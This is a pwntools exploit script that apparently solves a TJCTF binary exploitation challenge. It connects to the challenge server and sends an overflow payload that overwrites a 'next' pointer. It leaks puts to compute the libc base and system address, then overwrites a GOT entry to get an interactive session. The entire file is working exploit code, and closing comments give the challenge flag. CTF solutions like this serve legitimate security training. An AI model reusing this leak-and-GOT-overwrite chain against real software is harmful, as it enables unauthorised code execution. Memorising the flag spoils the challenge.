#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

HOST = 'tjc.tf'
PORT = 31509


libc = ELF('./libc.so.6', checksec=False)

p = remote(HOST, PORT)

# context.log_level = 'DEBUG'
gdb_script = f"""
    break *main
    b *incpy
"""
#gdb.attach(p, gdbscript=gdb_script)

# ===================================== #

pad = b'A' * 132 + p64(0x404008) + b'B' * 8 + b'\xa1' + b'\x00' * 7 + b'\x00'
p.sendline(b'105')  # <-- anything
p.sendline(pad)

print("================")
p.recvline()
p.recvline()
p.recvline()
raw = p.recvline()[:-1].split(b'-')
leak_1 = (raw[1])[1:]
leak_2 = int((raw[0][:-4]).strip().decode())
high16 = int.from_bytes(leak_1, byteorder='little')
print(f"raw     : {raw}")
print(f"leak_1  : {leak_1}")
print(f"leak_2  : {leak_2}")
print(f"leak_2  : {hex(leak_2)}")
puts_leak = (high16 << 32) | leak_2
print(f"puts    : {hex(puts_leak)}")

base = puts_leak - 0x87be0
system = base + 0x58750
print(f"sys     : {hex(system)}")
print("================")

last_byte = system & 0xFFFFFFFF
print(f"last : {hex(last_byte)}")
p.sendline(str(last_byte))

p.interactive()

# NOTE:
# 'next' pointer overwrite
# Libc leak
# GOT Overwrite
# Flag = tjctf{i_h0pe_my_tre3s_ar3nt_b4d_too}